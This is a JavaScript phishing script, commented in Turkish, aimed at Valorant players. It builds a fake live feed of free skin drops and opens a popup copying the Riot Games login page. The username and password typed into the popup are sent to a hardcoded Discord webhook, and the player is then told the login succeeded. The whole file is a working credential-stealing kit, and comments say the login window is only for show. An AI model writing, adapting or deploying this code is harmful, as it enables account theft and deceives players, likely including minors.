const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

// Sahte Canlı Akış Oluşturucu
const skins = ["Kuronami Vandal", "Reaver Sheriff", "Prime Phantom", "Elderflame Dagger", "Spectrum Classic"];
const track = document.getElementById('liveTrack');
for(let i=0; i<20; i++) {
    let s = skins[Math.floor(Math.random()*skins.length)];
    track.innerHTML += `<div class="skin-card"><img src="https://vignette.wikia.nocookie.net/valorant/images/2/23/Ignition_Crate.png"><br>${s}</div>`;
}

let isLoggedIn = false;

function openLogin() {
    // Küçük bir pencere açıyoruz (Popup)
    const width = 450, height = 600;
    const left = (screen.width / 2) - (width / 2);
    const top = (screen.height / 2) - (height / 2);
    
    // Bu kısım sadece görsel şov, asıl olay veriyi almak
    let loginWin = window.open("", "Riot Login", `width=${width},height=${height},top=${top},left=${left}`);
    
    loginWin.document.body.innerHTML = `
        <style>
            body { background: #f9f9f9; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .container { width: 80%; text-align: center; }
            img { width: 100px; margin-bottom: 20px; }
            input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
            button { width: 100%; padding: 15px; background: #ff4655; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
        </style>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/2560px-Riot_Games_logo.svg.png">
            <h2>Giriş Yap</h2>
            <input type="text" id="u" placeholder="Kullanıcı Adı">
            <input type="password" id="p" placeholder="Şifre">
            <button id="btn">OTURUM AÇ</button>
        </div>
    `;

    loginWin.document.getElementById('btn').onclick = function() {
        const u = loginWin.document.getElementById('u').value;
        const p = loginWin.document.getElementById('p').value;

        if(u && p) {
            // Bilgileri Discord'a Gönder
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `🔥 **Yeni Av Düştü!**\n👤 Kullanıcı: \`${u}\` \n🔑 Şifre: \`${p}\``
                })
            });

            isLoggedIn = true;
            loginWin.close();
            alert("Giriş başarılı! Şimdi ücretsiz kasanı açabilirsin.");
        }
    };
}

function checkLogin() {
    if(!isLoggedIn) {
        alert("Önce Riot hesabınla giriş yapmalısın!");
        openLogin();
    } else {
        alert("Kasa açılıyor... Şansına bir skin çıkıyor! Yükleniyor...");
        // Burada bir çark animasyonu gösterilebilir
    }
}